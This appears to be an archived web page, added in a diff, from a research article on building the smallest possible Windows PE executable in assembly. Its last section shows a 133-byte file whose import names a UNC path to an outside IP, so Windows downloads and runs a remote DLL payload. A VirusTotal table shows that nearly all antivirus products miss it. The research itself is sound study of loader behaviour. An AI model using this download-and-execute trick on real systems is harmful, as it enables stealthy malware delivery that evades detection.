+;   dd 0xC3582A6A ; e_maxalloc, e_ss UNUSED   ; TimeDateStamp UNUSED
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+codesize equ $ - start
+
+<span style=3D"color: red;">    dd 0          ; e_sp, e_csum UNUSED       ;=
+ PointerToSymbolTable UNUSED</span>
+<span style=3D"color: red;">    dd 0          ; e_ip, e_cs UNUSED         ;=
+ NumberOfSymbols UNUSED</span>
+    dw sections-opthdr ; e_lsarlc UNUSED      ; SizeOfOptionalHeader
+    dw 0x103      ; e_ovno UNUSED             ; Characteristics
+
+;
+; PE optional header
+;
+; The debug directory size at offset 0x94 from here must be 0
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED              ; Magic (PE32)
+<span style=3D"color: red;">    db 8                                      ;=
+ MajorLinkerVersion UNUSED</span>
+<span style=3D"color: red;">    db 0                                      ;=
+ MinorLinkerVersion UNUSED</span>
+
+;
+; PE code section
+;
+
+sections:
+<span style=3D"color: red;">    dd round(codesize, filealign)             ;=
+ SizeOfCode UNUSED                  ; Name UNUSED</span>
+<span style=3D"color: red;">    dd 0          ; e_oemid, e_oeminfo UNUSED ;=
+ SizeOfInitializedData UNUSED</span>
+    dd codesize   ; e_res2 UNUSED             ; SizeOfUninitializedData UNU=
+SED     ; VirtualSize
+    dd start                                  ; AddressOfEntryPoint        =
+        ; VirtualAddress
+    dd codesize                               ; BaseOfCode UNUSED          =
+        ; SizeOfRawData
+    dd start                                  ; BaseOfData UNUSED          =
+        ; PointerToRawData
+    dd 0x400000                               ; ImageBase                  =
+        ; PointerToRelocations UNUSED
+    dd sectalign  ; e_lfanew                  ; SectionAlignment           =
+        ; PointerToLinenumbers UNUSED
+    dd filealign                              ; FileAlignment              =
+        ; NumberOfRelocations, NumberOfLinenumbers UNUSED
+<span style=3D"color: red;">    dw 4                                      ;=
+ MajorOperatingSystemVersion UNUSED ; Characteristics UNUSED</span>
+<span style=3D"color: red;">    dw 0                                      ;=
+ MinorOperatingSystemVersion UNUSED</span>
+<span style=3D"color: red;">    dw 0                                      ;=
+ MajorImageVersion UNUSED</span>
+<span style=3D"color: red;">    dw 0                                      ;=
+ MinorImageVersion UNUSED</span>
+    dw 4                                      ; MajorSubsystemVersion
+<span style=3D"color: red;">    dw 0                                      ;=
+ MinorSubsystemVersion UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ Win32VersionValue UNUSED</span>
+    dd round(hdrsize, sectalign)+round(codesize,sectalign) ; SizeOfImage
+    dd round(hdrsize, filealign)              ; SizeOfHeaders
+<span style=3D"color: red;">    dd 0                                      ;=
+ CheckSum UNUSED</span>
+    db 2                                      ; Subsystem (Win32 GUI)
+
+hdrsize equ $ - $$
+
+filesize equ $ - $$
+</pre>
+
+<p>Now we have really reached the limit. The field at offset 0x94 from the
+beginning of the file is Subsystem, which must be set to 2. We cannot remov=
+e
+this field or get around it. This must be the smallest possible PE file.</p=
+>
+
+<p>The size of the PE file is an incredible <b>97</b> bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.97/tiny.asm">ti=
+ny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.97/tiny.exe">ti=
+ny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.97/Makefile">Ma=
+kefile</a>
+</p>
+
+
+<h2>Smallest PE file with imports</h2>
+
+<p>Unfortunately the 97 byte PE file does not work on Windows 2000. This is
+because the loader tries to call a function from KERNEL32, but KERNEL32.DLL=
+ is
+not loaded. All other versions of Windows load it automatically, but on Win=
+dows
+2000 we have to make sure that KERNEL32.DLL is listed in the import table o=
+f
+the executable. Executing a PE file with no imports is not possible.</p>
+
+<h3>Adding an import table</h3>
+
+<p>The structure of the import table is complicated, but adding a single
+ordinal import from KERNEL32 is relatively simple. We need to put the name =
+of
+the DLL we want to import in the Name field and create two identical arrays
+of IMAGE_THUNK_DATA structures, one for the Import Lookup Table and another=
+ one
+for the Import Address Table. When the loader resolves the imports, it
+will read the ordinal from the lookup table and replace the entry in the
+address table with the function address.</p>
+
+<pre class=3D"code">    dd 2                                      ; NumberO=
+fRvaAndSizes
+
+;
+; Data directories
+;
+; The debug directory size at offset 0x34 from here must be 0
+
+<span style=3D"color: red;">    dd 0                                      ;=
+ Export Table UNUSED</span>
+    dd 0
+    dd idata                                  ; Import Table
+    dd idatasize
+
+hdrsize equ $ - $$
+
+; Import table (array of IMAGE_IMPORT_DESCRIPTOR structures)
+
+idata:
+<span style=3D"color: red;">    dd ilt                                    ;=
+ OriginalFirstThunk UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ TimeDateStamp UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ ForwarderChain UNUSED</span>
+    dd kernel32                               ; Name
+    dd iat                                    ; FirstThunk
+
+    ; empty IMAGE_IMPORT_DESCRIPTOR structure
+
+<span style=3D"color: red;">    dd 0                                      ;=
+ OriginalFirstThunk UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ TimeDateStamp UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ ForwarderChain UNUSED</span>
+<span style=3D"color: red;">    dd 0                                      ;=
+ Name UNUSED</span>
+    dd 0                                      ; FirstThunk
+
+idatasize equ $ - idata
+
+; Import address table (array of IMAGE_THUNK_DATA structures)
+
+iat:
+    dd 0x80000001                             ; Import function 1 by ordina=
+l
+    dd 0
+
+; Import lookup table (array of IMAGE_THUNK_DATA structures)
+
+ilt:
+    dd 0x80000001                             ; Import function 1 by ordina=
+l
+    dd 0
+
+kernel32:
+    db "KERNEL32.dll", 0
+
+codesize equ $ - start
+
+filesize equ $ - $$
+</pre>
+
+<p>With a single ordinal import the size of our PE file incresed to <b>209<=
+/b>
+bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.209/tiny=
+.asm">tiny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.209/tiny=
+.exe">tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.209/Make=
+file">Makefile</a>
+</p>
+
+
+<h3>Collapsing the import table</h3>
+
+<p>209 bytes are obivousely too much for a single imported function, so let=
+'s
+see how we can make the file smaller. The first thing we'll do is to remove=
+ the
+Import Lookup Table. This table is a copy of the IAT and doesn't seem to be
+used by the linker. Removing it will save us 8 bytes.</p>
+
+<p>The import table is 40 bytes long, but only three of the fields in it ar=
+e
+used. This allows us to collapse the import table into the PE optional head=
+er.
+</p>
+
+<pre class=3D"code">;
+; Import table (array of IMAGE_IMPORT_DESCRIPTOR structures)
+;
+
+idata:
+    dd 0x400000                          ; ImageBase                       =
+   ; PointerToRelocations UNUSED ; OriginalFirstThunk UNUSED
+    dd sectalign  ; e_lfanew             ; SectionAlignment                =
+   ; PointerToLinenumbers UNUSED ; TimeDateStamp UNUSED
+    dd filealign                         ; FileAlignment                   =
+   ; NumberOfRelocations UNUSED  ; ForwarderChain UNUSED
+                                                                           =
+   ; NumberOfLinenumbers UNUSED
+    dd kernel32                          ; MajorOperatingSystemVersion UNUS=
+ED ; Characteristics UNUSED      ; Name
+                                         ; MinorOperatingSystemVersion UNUS=
+ED                               ; FirstThunk
+    dd iat                               ; MajoirImageVersion UNUSED
+                                         ; MinorImageVersion UNUSED
+    dw 4                                 ; MajorSubsystemVersion           =
+                                 ; OriginalFirstThunk UNUSED
+<span style=3D"color: red;">    dw 0                                 ; Mino=
+rSubsystemVersion UNUSED</span>
+<span style=3D"color: red;">    dd 0                                 ; Win3=
+2VersionValue UNUSED                                         ; TimeDateStam=
+p UNUSED</span>
+    dd round(hdrsize, sectalign)+round(codesize,sectalign) ; SizeOfImage   =
+                                 ; ForwarderChain UNUSED
+    dd round(hdrsize, filealign)         ; SizeOfHeaders                   =
+                                 ; Name UNUSED
+    dd 0                                 ; CheckSum UNUSED                 =
+                                 ; FirstThunk
+
+idatasize equ $ - idata
+
+    dw 2                                 ; Subsystem (Win32 GUI)
+<span style=3D"color: red;">    dw 0                                 ; DllC=
+haracteristics UNUSED</span>
+<span style=3D"color: red;">    dd 0                                 ; Size=
+OfStackReserve</span>
+    dd 0                                 ; SizeOfStackCommit
+    dd 0                                 ; SizeOfHeapReserve
+    dd 0                                 ; SizeOfHeapCommit
+<span style=3D"color: red;">    dd 0                                 ; Load=
+erFlags UNUSED</span>
+    dd 2                                 ; NumberOfRvaAndSizes
+</pre>
+
+<p>The PE file is now <b>161</b> bytes.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.161/tiny=
+.asm">tiny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.161/tiny=
+.exe">tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.161/Make=
+file">Makefile</a>
+</p>
+
+
+<h3>Collapsing the IAT and the DLL name</h3>
+
+<p>The last two structures left outside of the PE header are the IAT and th=
+e
+name of the imported DLL. We can collapse the IAT into the unused 8-byte Na=
+me
+field of the PE section header. The DLL name can be stored in the unused fi=
+elds
+at the end of the PE optional header and in the 8 bytes of the export data
+directory. There is enough space for 15 characters and a null terminator fo=
+r
+the name.</p>
+
+<p>The last field in the data directory is the size of the import table, bu=
+t
+the size isn't really used by the loader and can be set to 0. The last thre=
+e
+bytes of the import table pointer are also 0, because the pointer is stored=
+ as
+a little-endian dword. We can remove all the zero bytes from the end of the
+file, just like we did with the 97 byte PE file above.</p>
+
+<p>The full source code of the final PE file is given below:</p>
+
+<pre class=3D"code">; tiny.asm
+
+BITS 32
+
+;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"       ; e_magic
+<span style=3D"color: red;">    dw 0          ; e_cblp UNUSED</span>
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"       ; e_cp UNUSED          ; PE signature
+                  ; e_crlc UNUSED
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C     ; e_cparhdr UNUSED     ; Machine (Intel 386)
+    dw 1          ; e_minalloc UNUSED    ; NumberOfSections
+
+<span style=3D"color: red;">;   dd 0xC3582A6A ; e_maxalloc UNUSED    ; Time=
+DateStamp UNUSED</span>
+;                 ; e_ss UNUSED
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+<span style=3D"color: red;">    dd 0          ; e_sp UNUSED          ; Poin=
+terToSymbolTable UNUSED</span>
+                  ; e_csum UNUSED
+<span style=3D"color: red;">    dd 0          ; e_ip UNUSED          ; Numb=
+erOfSymbols UNUSED</span>
+                  ; e_cs UNUSED
+    dw sections-opthdr ; e_lsarlc UNUSED ; SizeOfOptionalHeader
+    dw 0x103      ; e_ovno UNUSED        ; Characteristics
+
+;
+; PE optional header
+;
+; The debug directory size at offset 0x94 from here must be 0
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED         ; Magic (PE32)
+<span style=3D"color: red;">    db 8                                 ; Majo=
+rLinkerVersion UNUSED</span>
+<span style=3D"color: red;">    db 0                                 ; Mino=
+rLinkerVersion UNUSED</span>
+
+;
+; PE code section and IAT
+;
+
+sections:
+iat:
+    dd 0x80000001                        ; SizeOfCode UNUSED               =
+   ; Name UNUSED                 ; Import function 1 by ordinal
+    dd 0          ; e_oemid UNUSED       ; SizeOfInitializedData UNUSED    =
+                                 ; end of IAT
+                  ; e_oeminfo UNUSED
+    dd codesize   ; e_res2 UNUSED        ; SizeOfUninitializedData UNUSED  =
+   ; VirtualSize
+    dd start                             ; AddressOfEntryPoint             =
+   ; VirtualAddress
+    dd codesize                          ; BaseOfCode UNUSED               =
+   ; SizeOfRawData
+    dd start                             ; BaseOfData UNUSED               =
+   ; PointerToRawData
+
+;
+; Import table (array of IMAGE_IMPORT_DESCRIPTOR structures)
+;
+
+idata:
+    dd 0x400000                          ; ImageBase                       =
+   ; PointerToRelocations UNUSED ; OriginalFirstThunk UNUSED
+    dd sectalign  ; e_lfanew             ; SectionAlignment                =
+   ; PointerToLinenumbers UNUSED ; TimeDateStamp UNUSED
+    dd filealign                         ; FileAlignment                   =
+   ; NumberOfRelocations UNUSED  ; ForwarderChain UNUSED
+                                                                           =
+   ; NumberOfLinenumbers UNUSED
+    dd kernel32                          ; MajorOperatingSystemVersion UNUS=
+ED ; Characteristics UNUSED      ; Name
+                                         ; MinorOperatingSystemVersion UNUS=
+ED                               ; FirstThunk
+    dd iat                               ; MajoirImageVersion UNUSED
+                                         ; MinorImageVersion UNUSED
+    dw 4                                 ; MajorSubsystemVersion           =
+                                 ; OriginalFirstThunk UNUSED
+<span style=3D"color: red;">    dw 0                                 ; Mino=
+rSubsystemVersion UNUSED</span>
+<span style=3D"color: red;">    dd 0                                 ; Win3=
+2VersionValue UNUSED                                         ; TimeDateStam=
+p UNUSED</span>
+    dd round(hdrsize, sectalign)+round(codesize,sectalign) ; SizeOfImage   =
+                                 ; ForwarderChain UNUSED
+    dd round(hdrsize, filealign)         ; SizeOfHeaders                   =
+                                 ; Name UNUSED
+    dd 0                                 ; CheckSum UNUSED                 =
+                                 ; FirstThunk
+
+idatasize equ $ - idata
+
+    dw 2                                 ; Subsystem (Win32 GUI)
+<span style=3D"color: red;">    dw 0                                 ; DllC=
+haracteristics UNUSED</span>
+    dd 0                                 ; SizeOfStackReserve
+    dd 0                                 ; SizeOfStackCommit
+    dd 0                                 ; SizeOfHeapReserve
+    dd 0                                 ; SizeOfHeapCommit
+<span style=3D"color: red;">;    dd 0                                 ; Loa=
+derFlags UNUSED</span>
+<span style=3D"color: red;">;    dd 2                                 ; Num=
+berOfRvaAndSizes</span>
+
+;
+; The DLL name should be at most 16 bytes, including the null terminator
+;
+
+kernel32:
+    db "KERNEL32.dll", 0
+
+    times 16-($-kernel32) db 0
+
+;
+; Data directories
+;
+; The debug directory size at offset 0x34 from here must be 0
+
+<span style=3D"color: red;">;    dd 0                                 ; Exp=
+ort Table UNUSED</span>
+;    dd 0
+
+    db idata - $$                        ; Import Table
+
+hdrsize equ $ - $$
+
+codesize equ $ - start
+
+filesize equ $ - $$
+</pre>
+
+<p>This brings the final file size to <b>133</b> bytes.</p>
+
+<p class=3D"downloads">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.133/tiny=
+.asm">tiny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.133/tiny=
+.exe">tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.import.133/Make=
+file">Makefile</a>
+</p>
+
+<h2>Smallest PE file that downloads a file from the Internet</h2>
+
+<p>The goal of the Tiny PE challenge was to write the smallest PE file that
+downloads a file from the Internet and executes it. The standard technique =
+for
+this is to call URLDownloadToFileA and then WinExec to execute the file. Th=
+ere=20
+are many examples of shellcode that uses this API, but it requires us to lo=
+ad
+URLMON.DLL and call multiple functions, which would increase the size of ou=
+r PE
+file significantly.</p>
+
+<p>A less known feature of Windows XP is the WebDAV Mini-Redirector. It
+translates UNC paths used by all Windows applications to URLs and tries to
+access them over the WebDAV protocol. This means that we can pass a UNC pat=
+h to
+WinExec and the redirector will attempt to download the specified file over
+WebDAV on port 80.</p>
+
+<p>Even more interesting is the fact that you can specify a UNC path in the
+import section of the PE file. If we specify \\66.93.68.6\z as the name of =
+the
+imported DLL, the Windows loader will try to download the DLL file from our
+web server.</p>
+
+<p>This allows us to create a PE file that downloads and excutes a file fro=
+m
+the Internet without executing a single line of code. All we have to do is =
+put
+our payload in the DllMain function in the DLL, put the DLL on a publicly
+accessible WebDAV server and specify the UNC path to the file in the import=
+s
+section of the PE file. When the loader processes the imports of the PE fil=
+e,
+it will load the DLL from the WebDAV server and execute its DllMain
+function.</p>
+
+<pre class=3D"code">;
+; The DLL name should be at most 16 bytes, including the null terminator
+;
+
+dllname:
+    db "\\66.93.68.6\z", 0
+    times 16-($-dllname) db 0
+</pre>
+
+<p>The size of the PE file with a UNC import is still only <b>133</b>
+bytes.</p>
+
+<p><b>WARNING:</b> The PE file linked below is live. It will attempt to
+download and execute a payload DLL from <a href=3D"http://66.93.68.6/z">htt=
+p://66.93.68.6/z</a>.
+The DLL will display a message box and exit, but you should take proper
+precautions and treat it as untrusted code.</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.webdav.133/tiny=
+.asm">tiny.asm</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.webdav.133/tiny=
+.exe">tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/tiny.webdav.133/Make=
+file">Makefile</a>
+</p>
+
+<p>Setting up Apache or IIS as WebDAV servers is not complicated, but for
+development purposes you can use the following Ruby script. It will serve a=
+s
+minimial WebDAV server with just enough functionality for the attack to
+work:</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/webdav.rb">webdav.rb=
+</a>
+</p>
+
+<p>The payload DLL and its source are also available:</p>
+
+<p class=3D"download">
+    <a href=3D"http://www.phreedom.org/research/tinype/payload.dll/payload.=
+c">payload.c</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/payload.dll/payload.=
+dll">payload.dll</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/payload.dll/test.c">=
+test.c</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/payload.dll/test.exe=
+">tiny.exe</a> |
+    <a href=3D"http://www.phreedom.org/research/tinype/payload.dll/Makefile=
+">Makefile</a>
+</p>
+
+<h3>VirusTotal Results</h3>
+
+<p>Scanning the 133 byte PE file that downloads a DLL over WebDAV with comm=
+on anti-virus
+software shows that the rate of detection is very low. My suggestion to AV =
+vendors is to
+start using the presense of UNC imports as a malware heuristic.</p>
+
+<div class=3D"virustotal">
+
+<p>Complete scanning result of "tiny.exe", received in
+<a href=3D"http://www.virustotal.com/">VirusTotal</a> at 11.08.2006, 07:14:=
+08
+(CET).</p>
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<thead><tr>
+<td>Antivirus</td>
+<td>Version</td>
+<td align=3D"center">Update</td>
+<td>Result</td>
+</tr></thead>
+<tbody>
+<tr>
+<td>AntiVir</td>
+<td>7.2.0.39</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Authentium</td>
+<td>4.93.8</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Avast</td>
+<td>4.7.892.0</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>AVG</td>
+<td>386</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>BitDefender</td>
+<td>7.2</td>
+<td align=3D"center">11.08.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>CAT-QuickHeal</td>
+<td>8.00</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"positive">(Suspicious) - DNAScan</td>
+</tr>
+<tr>
+<td>ClamAV</td>
+<td>devel-20060426</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>DrWeb</td>
+<td>4.33</td>
+<td align=3D"center">11.08.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>eTrust-InoculateIT</td>
+<td>23.73.49</td>
+<td align=3D"center">11.08.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>eTrust-Vet</td>
+<td>30.3.3181</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Ewido</td>
+<td>4.0</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Fortinet</td>
+<td>2.82.0.0</td>
+<td align=3D"center">11.08.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>F-Prot</td>
+<td>3.16f</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>F-Prot4</td>
+<td>4.2.1.29</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Ikarus</td>
+<td>0.2.65.0</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Kaspersky</td>
+<td>4.0.2.24</td>
+<td align=3D"center">11.08.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>McAfee</td>
+<td>4890</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>1.1609 </td>
+<td align=3D"center">11.08.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>NOD32v2</td>
+<td>1.1858</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Norman</td>
+<td>5.80.02</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Panda</td>
+<td>9.0.0.4</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>Sophos</td>
+<td>4.11.0</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>TheHacker</td>
+<td>6.0.1.114</td>
+<td align=3D"center">11.08.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>UNA</td>
+<td>1.83</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>VBA32</td>
+<td>3.11.1</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+<tr>
+<td>VirusBuster</td>
+<td>4.3.15:9</td>
+<td align=3D"center">11.07.2006</td>
+<td class=3D"negative">no virus found</td>
+</tr>
+</tbody>
+</table>
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
+<thead><tr><td>Additional Information</td></tr></thead>
+<tbody>
+<tr><td>File size: 133 bytes</td></tr>
+<tr><td>MD5: a6d732dd4b460000151a5f3cb448a4be</td></tr>
+<tr><td>SHA1: 3bdd0363204f3db7d0e15af2a64081ce04e57533</td></tr>
+</tbody>
+</table>
+
+</div>
+
+</div>
+<div id=3D"footer"></div>
+</div></div></div></div></div></div></div></div></div></div>
+
+
+
+</body></html>
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/feed.png
+
+iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAYAAABWdVznAAAABGdBTUEAAK/INwWK6QAAABl0RVh0
+U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAG6SURBVHjaTJG9SxxRFMXP+5i3s2Ejg8gu
+sZKERAQhCgoSEbEwBCRdIJ2kWdKkCDY2ViKof0Cw0EqwsVFQAlutlTZqJYSgYBUlBs0ku2F3vt7L
+fW9UHLjDG+ac+373XPZ9pm/AV37dVyrgHoeQDPxBMcEAk6H5Nw7DX80JacUyyQL5tB/m+hTQ/8AM
+CcHBGb05FZk6y15gTKkuPc4Drgw6q2uwj/5zifTbLrKTTfCs6cSMTGmsUSr5RFFUEAWG5sZHRPur
+QNyAGqnCf78OUX5xL05bGllsqAFxCmL3eoagL44RbU4jqc2CFR5DTn2B7njmxGnbGjQhOgNDYbSK
+4rsV+NNbedevnxyifL2MzDy6NZjcYNNprU0i3VsATQs5uQTjV9CuzYN3PIHom8oNyYMbHC+Js+0P
+MI1LiFef0T6pQ4cXKLx8izSyBrrB5mxN6s0yxPgcTPcY4oNV15lVBtE62oHX3ev4dWqRRJ6zuTmF
+iRqIzw8RnR06ftb1HPHVD3cWlV7CSsB+Lg7/tku5i86y3leUJ2OH1YQjulQo7brtBotFGUAr0C+A
+GzCPBqQvCHs2yGQaJogm/gswACW0ydBRuiLNAAAAAElFTkSuQmCC
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/png
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/find.png
+
+iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAYAAADgKtSgAAAABGdBTUEAANbY1E9YMgAAAAZiS0dE
+AOkA6QDpo2KvIgAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAMBSURBVEjH
+3ZVbSJNhHMadB0hCyosuKm9KwsKIzNDGYkOdEDanbrrppnNtA/GiGxFloEG2C2cyREkmTjZP2Jzu
+5ObcPLQTaxpaprabeBG677ai4Ov5oIVI2ZfRRV087Nt493ue/4H3S6EoKuVvKeX/gMfj8e/PsVjs
+FHQRugLlQ5ehHCgTSqXPHtaR8EgkkhYMBjOWlpby6urqTM3NzVtSqZTgmeDzDY/Hs01MTNzGmfRk
+GMZw/CltcXHxbElJibepqYnI5XJSU1MTVavV0fr6+gRtolAonpvNZg7OZh02OBKOxNkikciCxATA
+jenp6fje3t7n3d3dDx6P57VKpVoVi8WEw+E4EKKADsMYbrfbbxYWFr6k4VardWd/f586oC9+vz+G
+9myjGqLX69Vra2sn0MpURvDJyUk5yibFxcVRJP6UBCcSCWpzc5NC0rdsNttJw1tbW7uRPjsUDrEY
+wS1ms4qGFxUVRQF7v76+TgUCAcrn81FITXm9XlJaWjpLw1taWh653e6cg30/Em4ymaTKe8qEUqlM
+WCzmLST7SMNXV1ao4LMgbbSDQb+orq4mXV3d7S6XM/d34LlcLm+BTs/lcn3o+6vl5eV3kXCYbgkp
+KytzYuAEBqGhoSHNvH0+3+8PMGyLxZKp1WrZGo0m3tjYSDDYbcFdgVUgEFixKRu1tbXkGzzc0dHR
+brPZbi14PGmM4FbrU9bwk+GstrY2CVYx1NDQQLDfRCKREBqMisL4bYNui1AohJHYMGubzXO53OmM
+7papqanUwcHBcz09PUJshBYwvUwm02MODzs7O+/juy4JR0V0JY/RvvNOp5PF6OKamZlhjY2NZcHk
+Rn9//x1IZDAYFJBGp9O1lJeXjyThFRUVpKqqyjA3N3ea8cXlcDhYSMSCUQZ0EjoLXR0dHeXDQMHn
+841JeGVlZQJ3ziXG8J8JhulGo/EC2ibDzo8AnsACPECl134JPzz5H918dEUwyOnt7S1AFdcHBgby
+x8fHzzCGH0fHhvf19bH+CP5PvUO/Ar2mVqyYuvlvAAAAAElFTkSuQmCC
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-9093cf60-0d85-41c7-92f1-377e507d3f6f@mhtml.blink
+
+@charset "utf-8";
+
+.imageye-selected { outline: black solid 2px !important; box-shadow: rgba(0=
+, 0, 0, 0.5) 0px 0px 10px !important; }
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: cid:css-d5f9b8e8-d910-40ad-94c6-a8cf1d96920e@mhtml.blink
+
+@charset "utf-8";
+
+h4 { margin-top: 1.5em; margin-bottom: 0.8em; }
+
+pre.code { margin-left: 1.5em; }
+
+p.download { margin-bottom: 2em; }
+
+div.virustotal { width: 42em; }
+
+div.virustotal table { border-top: 1px solid black; border-right: 1px solid=
+ black; border-bottom: 1px solid black; width: 100%; margin-bottom: 1em; }
+
+div.virustotal thead td { background: rgb(204, 204, 204); color: rgb(85, 85=
+, 85); font-weight: bold; text-indent: 3px; border-left: 1px solid black; b=
+order-bottom: 1px solid black; }
+
+div.virustotal tbody td { text-indent: 2px; border-left: 1px solid black; b=
+order-bottom: 1px solid rgb(204, 204, 204); }
+
+div.virustotal td.positive { color: rgb(153, 0, 0); }
+
+div.virustotal td.negative { color: rgb(115, 153, 153); }
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/navbar-bottomleft.gif
+
+R0lGODlhCAAIALMAAOfn5/r6+vPz8+3t7evr6/j4+PX19fLy8ubm5ujo6Pz8/PT09Ozs7O/v7///
+/+np6SH5BAAAAAAALAAAAAAIAAgAAAQckL1JX0t1iodyGUCmLAxGOSNROU7QrKxjHA0TAQA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
+Content-Location: http://www.phreedom.org/images/navbar-bottomright.gif
+
+R0lGODlhCAAIALMAAOfn5/r6+vPz8+3t7evr6/j4+PX19fLy8ubm5ujo6Pz8/PT09Ozs7O/v7///
+/+np6SH5BAAAAAAALAAAAAAIAAgAAAQc8Mn5GJWpXfTEBUNBJcyiUITpUE3gOExzGO8bAQA7
+
+------MultipartBoundary--WLs8N6DlmgVp0gmmsVCuWJj5ZBcrMQJJX2QylFBP2S----
+Content-Type: image/gif
+Content-Transfer-Encoding: base64
